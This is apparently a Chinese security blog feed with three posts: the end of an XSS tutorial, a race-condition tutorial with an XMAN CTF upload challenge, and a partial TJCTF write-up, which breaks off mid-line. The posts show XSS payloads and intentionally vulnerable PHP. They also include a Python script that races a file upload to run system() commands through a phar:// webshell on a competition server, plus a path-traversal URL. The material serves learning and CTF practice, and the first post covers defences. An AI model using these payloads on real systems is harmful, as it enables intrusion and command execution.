class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>展示代码show_save.php</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;&lt;!--此网页用于展示数据库中的所有数据--&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt;</span><br><span class="line">&lt;title&gt;存储型XSS重现2&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;meimima123&quot;);</span><br><span class="line">mysql_select_db(&quot;test&quot;);</span><br><span class="line">$sql &#x3D; &quot;select id,text from xss&quot;;</span><br><span class="line">$result &#x3D; mysql_query($sql);</span><br><span class="line">while(@$row&#x3D;mysql_fetch_array($result))&#123;</span><br><span class="line">echo $row[&#39;id&#39;].&quot;:&quot;.$row[&#39;text&#39;].&quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>注意转义，将内容写入数据库：<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180819/08k85K1DeE.png?imageslim" alt="mark"><br>发现已经写入数据库：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from xss where id&#x3D;3;</span><br><span class="line">+------+-------------------------------+</span><br><span class="line">| id   | text                          |</span><br><span class="line">+------+-------------------------------+</span><br><span class="line">| 3    | text                          |</span><br><span class="line">| 3    | &lt;script&gt;alert(&#39;XSS&#39;)&lt;&#x2F;script&gt; |</span><br><span class="line">+------+-------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>当另一个网页浏览show_save.php时，就会触发XSS<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180819/hgIFIFHiK8.png?imageslim" alt="mark"></p><p>并且将恶意代码插入了HTML：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;&lt;!--此网页用于展示数据库中的所有数据--&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt;</span><br><span class="line">&lt;title&gt;存储型XSS重现2&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">0:text&lt;&#x2F;br&gt;0:text&lt;&#x2F;br&gt;:text&lt;&#x2F;br&gt;:2&lt;&#x2F;br&gt;1:222&lt;&#x2F;br&gt;3:text&lt;&#x2F;br&gt;3:&lt;script&gt;alert(&#39;XSS&#39;)&lt;&#x2F;script&gt;&lt;&#x2F;br&gt;&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><h2 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h2><p>xss_dom.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span><br><span class="line">&lt;title&gt;DOM型XSS重现&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;&lt;!--js脚本--&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> str = document.getElementById(<span class="string">&quot;text&quot;</span>).value;</span><br><span class="line">document.getElementById(<span class="string">&quot;t&quot;</span>).innerHTML = <span class="string">&quot;&lt;a href=&#x27;&quot;</span>+str+<span class="string">&quot;&#x27;&gt;testLink&lt;/a&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;div id=<span class="string">&quot;t&quot;</span>&gt;&lt;/div&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> id=<span class="string">&quot;text&quot;</span> =<span class="string">&quot;text&quot;</span> value=<span class="string">&quot;&quot;</span> /&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;button&quot;</span> id=<span class="string">&quot;s&quot;</span> value=<span class="string">&quot;url&quot;</span> onclick=<span class="string">&quot;test()&quot;</span> /&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>利用payload<code>&#39;&gt;&lt;img src=# onerror=&quot;alert(&#39;XSS&#39;)&quot;&gt;&lt;&#39;</code>执行XSS攻击：<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180819/cB92AHg2h5.png?imageslim" alt="mark"><br>利用<code>firebug</code>插件查看DOM节点的改变情况(js脚本改变DOM节点的内容，直接查看源码是不显示的)，发现<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180819/8G812h5BCd.png?imageslim" alt="mark"><br>而原来的link变成了：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div id&#x3D;&quot;t&quot;&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;&quot;&gt;</span><br><span class="line">&lt;img src&#x3D;&quot;#&quot; onerror&#x3D;&quot;alert(&#39;XSS&#39;)&quot;&gt;</span><br><span class="line">&lt;&#39;&#39;&gt;testLink</span><br><span class="line">&lt;&#x2F;a&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure><p>从而简单的绕过了link，执行了XSS脚本。</p><p>也可以利用这样的payload<code>&#39; onclick=alert(/xss/) //</code></p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180819/9kJ60cb0Ae.png?imageslim" alt="mark"></p><p>原来代码变成了：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div id&#x3D;&quot;t&quot;&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;&quot; onclick&#x3D;&quot;alert(&#x2F;xss&#x2F;)&quot; &#39;&#x3D;&quot;&quot;&gt;testLink&lt;&#x2F;a&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure><p>闭合<code>href</code>标签，注释后面多余内容，从而在用户点击超链接时，触发XSS。</p><hr><p>另外，DVWA上也有XSS漏洞环境，可以利用其复现漏洞，理解原理。</p><h1 id="XSS预防"><a href="#XSS预防" class="headerlink" title="XSS预防"></a>XSS预防</h1><p>因为XSS的根本就是向网站插入脚本代码，并使它运行的一种手段。防御方法分为两种，服务端防御和客户端防御。<br>服务端防御：</p><ol><li><strong>HttpOnly</strong><br>可以限制javascript不能读取cookie，防止会话ID泄露</li><li><strong>处理富文本</strong><br>过滤掉富文本中的敏感标签如（script、iframe、form），还有敏感词（javascript:） 等等</li></ol><p>客户端防御：</p><ol><li><strong>输入检查</strong><br>防止输入敏感字段，如javascript、cookie等等</li><li><strong>检查输出</strong><br>脚本都是通过混淆在HTML当中，被当成html代码的一部分才得到执行。<br>可以通过编码转义的办法，使得混淆在其中的脚本被当成文本处理，不会被执行。<br>编码转义的话，有三种方法：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">*1.  HTML encode*</span><br><span class="line">    将字符转换成HTMLEntities，一般会转（&amp;、&lt;、&gt;、&quot;、&#39;、&#x2F;）这6个字符。一般是在html标签属性输出的时候使用</span><br><span class="line">*2.  JavaScriptEncode*</span><br><span class="line">    使用”\“对特殊字符进行转义。</span><br><span class="line">    一般在script标签输出、事件输出、CSS输出</span><br><span class="line">*3.  URL Encode*</span><br><span class="line">    使用URLEncode的方法。</span><br></pre></td></tr></table></figure></li></ol><hr><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li>《白帽子讲web安全》-道哥</li><li><a href="https://blog.csdn.net/qq_gfq/article/details/79650451">XSS原理及其预防</a></li><li><a href="https://zhuanlan.zhihu.com/p/35468874">【从零开始学CTF】10、JavaScript 与 XSS 与 CSRF</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>条件竞争</title>
      <link href="/2018/08/16/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/"/>
      <url>/2018/08/16/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/</url>
      
        <content type="html"><![CDATA[<h1 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h1><p>在之前一个比赛遇到过，但是一直不会做，所以参考多位大佬的博客，记录一下，希望下次遇到的时候能够做出来。</p><h1 id="0x01-漏洞简介"><a href="#0x01-漏洞简介" class="headerlink" title="0x01 漏洞简介"></a>0x01 漏洞简介</h1><blockquote><p>条件竞争是指一个系统的运行结果依赖于不受控制的事件的先后顺序。当这些不受控制的事件并没有按照开发者想要的方式运行时，就可能会出现 bug。尤其在当前我们的系统中大量对资源进行共享，如果处理不当的话，就会产生条件竞争漏洞。</p></blockquote><p>上面的解释太官方了，我的理解是：</p><p><strong>程序在运用多线程时，没有做好线程同步，导致产生非预期结果。</strong></p><blockquote><p>竞争条件”发生在多个线程同时访问同一个共享代码、变量、文件等没有进行锁操作或者同步操作的场景中。  ——Wikipedia-computer_science</p></blockquote><p>这在我学习完《操作系统》后是很好理解的。</p><p>举个例子：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#-*-coding:utf-8-*-</span><br><span class="line">import threading</span><br><span class="line">COUNT &#x3D; 0</span><br><span class="line"></span><br><span class="line">def Run(threads_name):</span><br><span class="line">    global COUNT</span><br><span class="line">    read_value &#x3D; COUNT</span><br><span class="line">    print &quot;COUNT in Thread-%s is %d&quot; % (str(threads_name), read_value)</span><br><span class="line">    COUNT &#x3D; read_value + 1</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    threads &#x3D; []</span><br><span class="line">    for j in range(10):</span><br><span class="line">        t &#x3D; threading.Thread(target&#x3D;Run,args&#x3D;(j,))</span><br><span class="line">        threads.append(t)</span><br><span class="line">        t.start()</span><br><span class="line">    for i in range(len(threads)):</span><br><span class="line">        threads[i].join()</span><br><span class="line">    print(&quot;Finally, The COUNT is %d&quot; % (COUNT,))</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>运行结果如下：<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180823/GeE49mcK08.png?imageslim" alt="mark"></p><p>按照我们的预想，结果应该都是<code>10</code>，但是发现结果可能存在<strong>非预期解</strong>，并且出现非预期的概率还挺大的。</p><p>这是什么原因呢？</p><p>原因就在于我们没有对变量<code>COUNT</code>做同步制约，导致可能Thread-7在读<code>COUNT</code>,还没来得及更改<code>COUNT</code>,Thread-8抢夺资源，也来读<code>COUNT</code>,并且将<code>COUNT</code>修改为<code>它读的结果+1</code>，由此出现非预期。</p><p>同样的，WEB应用程序因为要为很多用户服务，势必要采用多线程，但是，如果种种原因导致线程间的同步机制没处理好，那么也就会导致非预期和条件竞争的漏洞。</p><h1 id="0x02-漏洞实战"><a href="#0x02-漏洞实战" class="headerlink" title="0x02 漏洞实战"></a>0x02 漏洞实战</h1><h1 id="0x03-条件竞争在CTF中的运用"><a href="#0x03-条件竞争在CTF中的运用" class="headerlink" title="0x03 条件竞争在CTF中的运用"></a>0x03 条件竞争在CTF中的运用</h1><h2 id="1-文件上传-条件竞争"><a href="#1-文件上传-条件竞争" class="headerlink" title="1.文件上传+条件竞争"></a>1.文件上传+条件竞争</h2><p>一般是上传文件，绕过防护之后，小马又会被立马删除。<br>但是由于文件存在过，我们可以利用python脚本不断访问shell，这样就形成了<code>python脚本</code>和<code>web删除程序</code>之间的竞争，一定的测试量后，可以竞争到资源，执行shell，从而得到flag。</p><p>CUMT平台上有一道经典例题，但是这个环境关了，于是我也只是看了看WP，参考<a href="http://iwenhu.cn/2018/04/07/Race-Condition/">这篇大佬的博客</a></p><h2 id="2-Session-条件竞争"><a href="#2-Session-条件竞争" class="headerlink" title="2.Session+条件竞争"></a>2.Session+条件竞争</h2><p><a href="http://iwenhu.cn/2018/04/07/Race-Condition/">0CTF2018中的一个题</a></p><blockquote><p>服务器通过session对请求顺序建立了锁，因此我们需要多个session，使用两个浏览器登录同一个账户即可。在将IP改为8.8.8.8时，有短时间的网络请求堵塞，我们在这个时间段，使用另一个session提交请求，即可通过验证，成功将IP改为8.8.8.8，然后获得flag。</p></blockquote><h2 id="3-XMAN-Easy-Gallery"><a href="#3-XMAN-Easy-Gallery" class="headerlink" title="3. XMAN-Easy Gallery"></a>3. XMAN-Easy Gallery</h2><p>这道题我做了==、</p><p>首先php伪协议读源码</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;202.112.51.184:8004&#x2F;index.php?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;upload</span><br></pre></td></tr></table></figure><p>upload.php</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html lang&#x3D;&quot;zh-CN&quot;&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$error&#x3D;$_FILES[&#39;pic&#39;][&#39;error&#39;];</span><br><span class="line">$tmpName&#x3D;$_FILES[&#39;pic&#39;][&#39;tmp_name&#39;];</span><br><span class="line">$name&#x3D;$_FILES[&#39;pic&#39;][&#39;name&#39;];</span><br><span class="line">$size&#x3D;$_FILES[&#39;pic&#39;][&#39;size&#39;];</span><br><span class="line">$type&#x3D;$_FILES[&#39;pic&#39;][&#39;type&#39;];</span><br><span class="line">try&#123;</span><br><span class="line">if($name!&#x3D;&#x3D;&quot;&quot;)</span><br><span class="line">&#123;</span><br><span class="line">$name1&#x3D;substr($name,-4);</span><br><span class="line">if(($name1!&#x3D;&#x3D;&quot;.gif&quot;) and ($name1!&#x3D;&#x3D;&quot;.jpg&quot;))</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;hehe&quot;;</span><br><span class="line">echo &quot;&lt;script language&#x3D;javascript&gt;alert(&#39;不允许的文件类型！&#39;);history.go(-1)&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br><span class="line">if($type!&#x3D;&#x3D;&quot;image&#x2F;jpeg&quot;&amp;&amp;$type!&#x3D;&#x3D;&quot;image&#x2F;gif&quot;)</span><br><span class="line">&#123;</span><br><span class="line">echo mime_content_type($tmpName);</span><br><span class="line">echo &quot;&lt;script language&#x3D;javascript&gt;alert(&#39;不允许的文件类型！&#39;);history.go(-1)&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br><span class="line">if(is_uploaded_file($tmpName))&#123;</span><br><span class="line">$time&#x3D;time();</span><br><span class="line">$rootpath&#x3D;&#39;uploads&#x2F;&#39;.$time.$name1;</span><br><span class="line">if(!move_uploaded_file($tmpName,$rootpath))&#123;</span><br><span class="line">echo &quot;&lt;script language&#x3D;&#39;JavaScript&#39;&gt;alert(&#39;文件移动失败!&#39;);window.location&#x3D;&#39;index.php?page&#x3D;submit&#39;&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">sleep(5);</span><br><span class="line">if ($type&#x3D;&#x3D;&#39;image&#x2F;jpeg&#39;)</span><br><span class="line">&#123;</span><br><span class="line">$im &#x3D; @imagecreatefromjpeg($rootpath);</span><br><span class="line">if(!$im)&#123;</span><br><span class="line">  $im &#x3D; imagecreatetruecolor(150, 30);</span><br><span class="line">  $bg &#x3D; imagecolorallocate($im, 255, 255, 255);</span><br><span class="line">  $text_color &#x3D; imagecolorallocate($im, 0, 0, 255);</span><br><span class="line">  imagefilledrectangle($im, 0, 0, 150, 30, $bg);</span><br><span class="line">  imagestring($im, 3, 5, 5, &quot;Error loading image&quot;, $text_color);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">$time&#x3D;time();</span><br><span class="line">$new_rootpath&#x3D;&#39;uploads&#x2F;&#39;.$time.$name1;</span><br><span class="line">imagejpeg($im,$new_rootpath);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else if ($type&#x3D;&#x3D;&#39;image&#x2F;gif&#39;)</span><br><span class="line">&#123;</span><br><span class="line">$im &#x3D; @imagecreatefromgif($rootpath);</span><br><span class="line">if(!$im)&#123;</span><br><span class="line">  $im &#x3D; imagecreatetruecolor(150, 30);</span><br><span class="line">  $bg &#x3D; imagecolorallocate($im, 255, 255, 255);</span><br><span class="line">  $text_color &#x3D; imagecolorallocate($im, 0, 0, 255);</span><br><span class="line">  imagefilledrectangle($im, 0, 0, 150, 30, $bg);</span><br><span class="line">  imagestring($im, 3, 5, 5, &quot;Error loading image&quot;, $text_color);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">$time&#x3D;time();</span><br><span class="line">$new_rootpath&#x3D;&#39;uploads&#x2F;&#39;.$time.$name1;</span><br><span class="line">imagegif($im,$new_rootpath);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">unlink($rootpath);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;图片ID：&quot;.$time;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">catch(Exception $e)</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;ERROR&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line"> ?&gt;</span><br><span class="line"> &lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>首先是上传的一些判断<br>之后会验证图像是否正确载入<br>如果上传了正确的图片，<code>imagecreatefromjpeg()</code>返回图像资源，文件名更换为新的时间戳，用新的文件路径<code>$new_rootpath</code>输出图片，最后删除原文件<code>unlink($rootpath);</code><br>如果上传了不正确的图片，不会更换新的文件路径，最后还要删除源文件<code>unlink($rootpath);</code><br>看上去没问题，但是上传完文件执行了<code>sleep(5);</code>，所以上传的文件即使验证不成功也有5秒钟的时间存在，所以在五秒钟的时间内利用就可以.</p><p>一边用<code>Burp Intruer</code>发包<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180824/a5EH2kgaaJ.png?imageslim" alt="mark"></p><p>一边用python脚本就访问链接，会存在没被删除的，从而利用getshell</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">id &#x3D; int(time.time())</span><br><span class="line">s&#x3D;requests.session()</span><br><span class="line">data0&#x3D;&#123;&#39;v&#39;:&quot;phpinfo();&quot;,&#125;</span><br><span class="line">data1&#x3D;&#123;</span><br><span class="line">    &#39;v&#39;:&quot;system(&#39;ls&#39;);&quot;</span><br><span class="line">&#125;</span><br><span class="line">data2&#x3D;&#123;</span><br><span class="line">    &#39;v&#39;:&quot;system(&#39;cat xxxxxxxxxasdasf_flag.php&#39;);&quot;</span><br><span class="line">&#125;</span><br><span class="line">while 1:</span><br><span class="line">    for i in range(id-50,id+50):</span><br><span class="line">        url &#x3D; &#39;http:&#x2F;&#x2F;202.112.51.184:9005&#x2F;index.php?page&#x3D;phar:&#x2F;&#x2F;.&#x2F;uploads&#x2F;&#39; + str(i) + &#39;.jpg&#x2F;v&#39;</span><br><span class="line">        t&#x3D;s.post(url,data&#x3D;data1).content</span><br><span class="line">        print i</span><br><span class="line">        if &#39;flag&#39; in t:</span><br><span class="line">            print t</span><br><span class="line">            break</span><br><span class="line">while 1:</span><br><span class="line">    for i in range(id-50,id+50):</span><br><span class="line">        url &#x3D; &#39;http:&#x2F;&#x2F;202.112.51.184:9005&#x2F;index.php?page&#x3D;phar:&#x2F;&#x2F;.&#x2F;uploads&#x2F;&#39; + str(i) + &#39;.jpg&#x2F;v&#39;</span><br><span class="line">        t&#x3D;s.post(url,data&#x3D;data1).content</span><br><span class="line">        print i</span><br><span class="line">        if &#39;flag&#39; in t:</span><br><span class="line">            print t</span><br><span class="line">            break</span><br><span class="line"># XMAN&#123;Rush_Rush_oo000&#125;</span><br></pre></td></tr></table></figure><h1 id="0x05-总结以及漏洞修复"><a href="#0x05-总结以及漏洞修复" class="headerlink" title="0x05 总结以及漏洞修复"></a>0x05 总结以及漏洞修复</h1><p>条件竞争漏洞产生的很大一部分原因是程序不严谨，对于并发操作没有做好同步制约，毕竟开发者在进行代码开发的时候，常常倾向于代码会以线性的方式执行，而并行服务器会同时执行多个线程，这就会导致意想不到的结果。</p><p>条件竞争漏洞的修复主要看开发者，以上述的Web漏洞为例：</p><ol><li>对于数据库的操作，比较正统的方法是设置锁</li><li>对于文件上传，“引狼入室”的方法不可取，最好先进行充分的检测，再上传到服务器。</li></ol><h1 id="0xff-参考链接"><a href="#0xff-参考链接" class="headerlink" title="0xff 参考链接"></a>0xff 参考链接</h1><ol><li><a href="https://blog.csdn.net/u011377996/article/details/79511160">小结一下Web的条件竞争的题目</a></li><li><a href="http://iwenhu.cn/2018/04/07/Race-Condition/">条件竞争（Race Condition） </a></li><li><a href="http://seaii-blog.com/index.php/2017/04/26/49.html">Web中的条件竞争漏洞</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
            <tag> 条件竞争 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TJCTF2018 WP</title>
      <link href="/2018/08/14/TJCTF%20WP/"/>
      <url>/2018/08/14/TJCTF%20WP/</url>
      
        <content type="html"><![CDATA[<h1 id="TJCTF"><a href="#TJCTF" class="headerlink" title="TJCTF"></a>TJCTF</h1><p>这个CTF怎么说呢。。。脑洞比较大，但是很多题其实都不难。只是这个脑洞，我真的有点想不到。。。也还算学到点东西吧，总结一下。</p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="blank"><a href="#blank" class="headerlink" title="blank"></a>blank</h2><p>查看源代码，get flag</p><h2 id="Cookie-Monster"><a href="#Cookie-Monster" class="headerlink" title="Cookie Monster"></a>Cookie Monster</h2><p>带着cookie访问一下就行链接就行。</p><h2 id="Central-Savings-Account"><a href="#Central-Savings-Account" class="headerlink" title="Central Savings Account"></a>Central Savings Account</h2><p>忘记密码，要求我们找到密码，于是在<code>firefox-&gt;F12-&gt;调用栈-&gt;main.js</code>找到了下面的代码。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$(document).ready(function() &#123;</span><br><span class="line">    $(&quot;#login-form&quot;).submit(function() &#123;</span><br><span class="line">        if (md5($(&quot;#password&quot;).val()).toLowerCase() &#x3D;&#x3D;&#x3D; &quot;698967f805dea9ea073d188d73ab7390&quot;) &#123;</span><br><span class="line">            $(&quot;html&quot;).html(&quot;&lt;h1&gt;Login Succeeded!&lt;&#x2F;h1&gt;&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            $(&quot;html&quot;).html(&quot;&lt;h1&gt;Login Failed!&lt;&#x2F;h1&gt;&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><code>md5(password) === &quot;698967f805dea9ea073d188d73ab7390&quot;</code></p><p>password = “avalon”</p><h2 id="Programmable-Hyperlinked-Pasta"><a href="#Programmable-Hyperlinked-Pasta" class="headerlink" title="Programmable Hyperlinked Pasta"></a>Programmable Hyperlinked Pasta</h2><p><a href="https://programmable_hyperlinked_pasta.tjctf.org/?lang=/../flag.txt">https://programmable_hyperlinked_pasta.tjctf.org/?lang=/../flag.txt</a></p><h2 id="Request-Me"><a href="#Request-Me" class="headerlink" title="Request Me"></a>Request Me</h2><p>1.tips:google http request options<br>于是，我用OPTIONS 请求网站，得到这样的响应</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET, POST, PUT, DELETE, OPTIONS</span><br><span class="line">Parameters: username, password</span><br><span class="line">Some methods require HTTP Basic Auth</span><br></pre></td></tr></table></figure><p>2.根据OPTIONS的响应，我们登陆需要username和password但是我们明显不知道，PUT是上传用的请求，于是可以上传一个username和password,</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PUT https:&#x2F;&#x2F;request_me.tjctf.org&#x2F;?username&#x3D;v0w&amp;password&#x3D;123</span><br></pre></td></tr></table></figure><p>响应</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">I stole your credentials!</span><br></pre></td></tr></table></figure><p>3.这时POST请求，发现一个授权，于是输入刚刚PUT上去的username&amp;password,得到这样的响应</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Maybe you should take your credentials back?</span><br></pre></td></tr></table></figure><p>让我们把证书拿走，应该是删除的意思。<br>4.<code>DELETE https://request_me.tjctf.org/</code><br>postdata(username=v0w&amp;password=123)</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Finally! The flag is tjctf&#123;wHy_4re_th3r3_s0_m4ny_Opt10nS&#125;</span><br></pre></td></tr></table></figure><h2 id="Moar-Horses"><a href="#Moar-Horses" class="headerlink" title="Moar Horses"></a>Moar Horses</h2><p>F**king game</p><p>一直访问就行了，我tm<br>脚本如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url &#x3D; &#39;https:&#x2F;&#x2F;moar_horse.tjctf.org&#x2F;&#39;</span><br><span class="line">url0 &#x3D; &#39;https:&#x2F;&#x2F;moar_horse.tjctf.org&#x2F;legs&#39;</span><br><span class="line">res &#x3D; requests.get(url0)</span><br><span class="line">print res.text</span><br><span class="line">txt &#x3D; res.text</span><br><span class="line">i &#x3D; 0</span><br><span class="line">while &#39;tjctf&#39; not in txt:</span><br><span class="line">res &#x3D; requests.get(url0)</span><br><span class="line">txt &#x3D; res.text</span><br><span class="line">i +&#x3D; 1</span><br><span class="line">print i</span><br><span class="line"></span><br><span class="line">print txt</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">       | | | |             || |  &lt;&#x2F;pre&gt;</span><br><span class="line"></span><br><span class="line">&lt;a href&#x3D;&quot;&#x2F;legs&quot;&gt;tjctf&#123;h0rs3s_h4v3_lonG_l3gS&#125;&lt;&#x2F;a&gt;</span><br><span class="line">[Finished in 89.8s]</span><br></pre></td></tr></table></figure><h1 id="Msic"><a href="#Msic" class="headerlink" title="Msic"></a>Msic</h1><h2 id="trippy"><a href="#trippy" class="headerlink" title="trippy"></a>trippy</h2><p>文本查找tjctf，即可。</p><h2 id="Weird-Logo"><a href="#Weird-Logo" class="headerlink" title="Weird Logo"></a>Weird Logo</h2><p>Stegslove 打开切换通道即可看到flag</p><h2 id="Discord"><a href="#Discord" class="headerlink" title="Discord"></a>Discord</h2><p>签到题</p><h2 id="interference"><a href="#interference" class="headerlink" title="interference"></a>interference</h2><p>我们有2个由白色和黑色像素组成的图像。 我们使用Stegsolve来操作：<code>NOT（IMG1 ^ SUB（IMG1，IMG2））</code>。</p><ol><li>v3 = v1 - v2</li><li>res = v1 ^ v3</li><li>res = Not(res)    # 反色</li></ol><p>关于这个算法，我也不太明白为什么，但是，尝试着结果就出来了。</p><pre><code>tjctf&#123;m1x1ing_and_m4tchIng_1m4g3s_15_fun&#125;</code></pre><h2 id="Nothing-but-Everything"><a href="#Nothing-but-Everything" class="headerlink" title="Nothing but Everything"></a>Nothing but Everything</h2><blockquote><p>My computer got infected with ransomware and now none of my documents are accessible anymore! If you help me out, I’ll reward you a flag!</p></blockquote><p>我真的 没想到这个怎么做，下载下来的文件都是数字，可能是某种算法加密，但是算法那么多，我真的想不到是那种算法。</p><p>在看了<a href="https://m.youtube.com/watch?v=m9FuGso8BE8&list=PL1H1sBF1VAKVmrjF1uWh5wK9a2IzmUjPc&index=7">大佬的视频</a>以后才知道的</p><p>下面就将大佬的视频翻译成wp吧2333</p><p>下载文件后解压，发现全是数字，haha.txt<br>有提示</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">All your files have been encrypted with a uncrackable algorithm.</span><br><span class="line">You are now screwed forever.</span><br></pre></td></tr></table></figure><p>看到文件名<code>1262404985085867488371</code>,联想全是数字，会不会是hex以后编码成数字，于是猜测 会不会是hex？</p><p>于是试了一下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; hex(1262404985085867488371)</span><br><span class="line">&#39;0x446f63756d656e7473L&#39;</span><br><span class="line">&gt;&gt;&gt; hex(1262404985085867488371)[2:-1]</span><br><span class="line">&#39;446f63756d656e7473&#39;</span><br><span class="line">&gt;&gt;&gt; hex(1262404985085867488371)[2:-1].decode(&#39;hex&#39;)</span><br><span 